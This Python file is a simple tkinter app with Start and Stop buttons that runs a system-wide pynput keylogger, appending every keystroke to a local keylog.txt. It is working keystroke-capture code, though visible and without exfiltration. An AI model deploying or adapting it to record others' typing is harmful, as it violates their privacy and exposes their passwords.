import tkinter as tk
from pynput.keyboard import Listener


class KeyloggerGUI:

    def __init__(self,root):
        self.root = root
        self.listener = None 
        self.is_logging = False
        

    def root_window(self, root, title, geometry):
        root.title(title)
        root.geometry(geometry)
    
    def create_buttons(self,root):
        self.start_button = tk.Button(root, text='Start Keylogger', command = self.start_keylogger)
        self.start_button.pack(pady=20)

        self.stop_button = tk.Button(root, text='Stop Keylogger', command=self.stop_keylogger)
        self.stop_button.pack()

    
    def store_data(self, key):
        with open('keylog.txt', 'a') as text:
            text.write(str(key) + '\n')
    
    def start_keylogger(self):
        if not(self.is_logging):
            self.is_logging = True
            self.listener = Listener(on_press=self.store_data)
            self.listener.start()
            self.start_button.config(state=tk.DISABLED)
            self.stop_button.config(state=tk.NORMAL)

    def stop_keylogger(self):
        if self.is_logging:
            self.is_logging = False
            self.listener.stop()
            self.listener = None
            self.start_button.config(state=tk.NORMAL)
            self.stop_button.config(state=tk.DISABLED)



root = tk.Tk()
window = KeyloggerGUI(root)
window.root_window(root,'Keylogger','300x150')
window.create_buttons(root)
root.mainloop()


    



        
   

